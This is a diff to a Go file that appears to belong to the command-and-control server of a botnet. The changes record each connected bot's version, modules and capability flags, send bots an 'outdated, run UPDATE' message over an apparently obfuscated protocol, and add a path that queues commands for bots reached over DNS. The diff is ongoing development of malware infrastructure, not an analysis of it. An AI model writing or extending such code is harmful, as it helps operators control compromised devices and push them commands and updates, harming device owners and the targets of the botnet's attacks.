@@ -5,19 +5,26 @@ import (
 	"io"
 	"log"
 	"net"
+	"strings"
 	"time"
 )
 
 type Bot struct {
-	uid     int
-	conn    net.Conn
-	version byte
-	source  string
-	ctx     *HandshakeCtx
+	uid        int
+	conn       net.Conn
+	version    byte
+	versionStr string
+	source     string
+	modules    []string
+	ctx        *HandshakeCtx
+	capFlags   string
+	remoteID   int
+	remoteUID  int
+	isDns      bool
 }
 
 func NewBot(conn net.Conn, version byte, source string, ctx *HandshakeCtx) *Bot {
-	return &Bot{-1, conn, version, source, ctx}
+	return &Bot{-1, conn, version, "", source, nil, ctx, "", 0, 0, false}
 }
 
 func (this *Bot) Handle() {
@@ -28,7 +35,6 @@ func (this *Bot) Handle() {
 	}
 
 	if this.ctx != nil && this.ctx.Valid {
-		// polymorphic mode: read wire-framed packets, handle responses
 		rdbuf := make([]byte, 8192)
 		for {
 			this.conn.SetDeadline(time.Now().Add(180 * time.Second))
@@ -52,7 +58,29 @@ func (this *Bot) Handle() {
 				continue
 			}
 			if pktType == PktTypeModuleList && len(payload) > 0 {
-				log.Printf("[module] %s: %s", this.conn.RemoteAddr(), string(payload))
+				raw := string(payload)
+				parts := strings.SplitN(raw, "\x00", 2)
+				if len(parts) >= 1 {
+					this.versionStr = parts[0]
+					if len(parts) >= 2 && len(parts[1]) > 0 {
+						this.capFlags = parts[1]
+					}
+				}
+				if idx := strings.IndexByte(this.versionStr, ','); idx >= 0 {
+					this.modules = strings.Split(this.versionStr[idx+1:], ",")
+					this.versionStr = this.versionStr[:idx]
+				}
+				if debugMode {
+					log.Printf("[bot] %s version=%s modules=%v caps=%s",
+						this.conn.RemoteAddr(), this.versionStr, this.modules, this.capFlags)
+				}
+				// warn if outdated
+				if this.versionStr != cfg.BotVersion && this.versionStr != "" {
+					msg := "Your bot version is outdated (" + this.versionStr + "). Expected " + cfg.BotVersion + ". Run UPDATE to get latest."
+					if this.ctx != nil && this.ctx.Valid {
+						polymorphicSend(this.conn, this.ctx, PktTypeVersionWarn, 0, []byte(msg))
+					}
+				}
 			}
 		}
 	}
@@ -91,6 +119,15 @@ func (this *Bot) Handle() {
 }
 
 func (this *Bot) QueueBuf(buf []byte) {
+	if this.isDns {
+		// DNS bot — queue packet for DNS delivery
+		if len(buf) >= 4 {
+			payload := buf[2:] // strip wire length prefix
+			QueueDnsPkt(this.uid, payload)
+		}
+		return
+	}
+
 	if len(buf) < 2 {
 		return
 	}
